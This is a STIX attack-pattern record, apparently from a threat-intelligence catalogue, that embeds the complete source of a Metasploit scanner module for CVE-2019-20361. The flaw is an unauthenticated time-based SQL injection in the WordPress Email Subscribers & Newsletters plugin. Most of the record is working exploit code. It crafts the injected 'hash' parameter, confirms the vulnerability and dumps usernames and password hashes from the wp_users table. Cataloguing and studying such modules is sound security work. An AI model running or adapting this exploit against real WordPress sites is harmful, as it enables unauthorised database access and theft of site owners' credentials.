{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8a20e578-38ca-4fac-88bb-cf1edd927cee",
    "created": "2024-08-14T16:28:48.543681Z",
    "modified": "2024-08-14T16:28:48.543685Z",
    "name": "WordPress Email Subscribers and Newsletter Hash SQLi Scanner",
    "description": " Email Subscribers & Newsletters plugin contains an unauthenticated timebased SQL injection in versions before 4.3.1.  The hash parameter is vulnerable to injection. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_email_sub_news_sqli.rb",
            "external_id": "wp_email_sub_news_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-20361"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Email Subscribers and Newsletter Hash SQLi Scanner',\n        'Description' => %q{\n          Email Subscribers & Newsletters plugin contains an unauthenticated timebased SQL injection in\n          versions before 4.3.1.  The hash parameter is vulnerable to injection.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'red0xff', # sqli libs in msf\n          'Wordfence' # blog post says team, no individual(s) called out for discovery\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'EDB', '48699' ],\n          [ 'CVE', '2019-20361' ],\n          [ 'URL', 'https://www.wordfence.com/blog/2019/11/multiple-vulnerabilities-patched-in-email-subscribers-newsletters-plugin/' ]\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2019-11-13'\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])\n    ]\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      fail_with Failure::NotVulnerable, 'Server not online or not detected as wordpress'\n    end\n\n    checkcode = check_plugin_version_from_readme('email-subscribers', '4.3.1')\n    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)\n      fail_with Failure::NotVulnerable, 'Email Subscribers and Newsletter version not vulnerable'\n    end\n    print_good('Vulnerable version of Email Subscribers and Newsletter detected')\n\n    guid = Rex::Text.rand_guid\n    email = Rex::Text.rand_mail_address\n\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|\n      data = %|{\"contact_id\":\"100','100','100','3'),('1594999398','1594999398','1',(1) AND #{payload},'100','100','3'),|\n      data << %|('1594999398','1594999398','1','100\",\"campaign_id\":\"100\",\"message_id\":\"100\",\"email\":\"#{email}\",\"guid\":\"#{guid}\",\"action\":\"open\"}|\n\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path),\n        'vars_get' => {\n          'hash' => Base64.strict_encode64(data),\n          'es' => 'open'\n        }\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n    unless @sqli.test_vulnerable\n      fail_with Failure::PayloadFailed, \"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\"\n    end\n\n    columns = ['user_login', 'user_pass']\n    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    results.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-13"
}